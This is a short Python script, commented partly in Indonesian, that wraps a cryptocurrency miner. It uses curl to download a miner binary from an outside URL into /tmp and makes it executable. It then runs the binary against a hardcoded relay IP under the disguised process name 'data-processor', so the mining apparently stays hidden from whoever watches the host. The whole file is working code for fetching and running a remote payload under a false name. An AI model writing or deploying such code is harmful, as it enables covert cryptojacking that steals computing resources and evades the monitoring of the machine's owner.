#!/usr/bin/env python3
"""
Mining relay wrapper - process name jadi 'data-processor'
Usage: python3 run-worker.py --wallet YOUR_WALLET --worker WORKER_NAME
"""
import os
import sys
import subprocess
import stat
import argparse

# === DEFAULT CONFIG ===
RELAY = "167.172.78.17:9000"
BINARY = "/tmp/data-processor"
MINER_URL = "https://pearlhash.xyz/downloads/pearl-miner-v12"

def main():
    parser = argparse.ArgumentParser(description="Mining relay wrapper")
    parser.add_argument("--wallet", required=True, help="Wallet address")
    parser.add_argument("--worker", default="worker1", help="Worker name")
    parser.add_argument("--relay", default=RELAY, help=f"Relay host:port (default: {RELAY})")
    args = parser.parse_args()

    # Download binary kalau belum ada
    if not os.path.exists(BINARY):
        print(f"[*] Downloading to {BINARY}...")
        subprocess.run(["curl", "-sL", MINER_URL, "-o", BINARY], check=True)
        os.chmod(BINARY, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
        print("[+] Done")

    # Build args
    cmd = [BINARY, "--host", args.relay, "--user", args.wallet, "--worker", args.worker]

    print(f"[*] Starting: process={os.path.basename(BINARY)}")
    print(f"[*] Relay: {args.relay}")
    print(f"[*] Worker: {args.worker}")

    # Replace process - process name jadi 'data-processor'
    os.execv(BINARY, cmd)

if __name__ == "__main__":
    main()
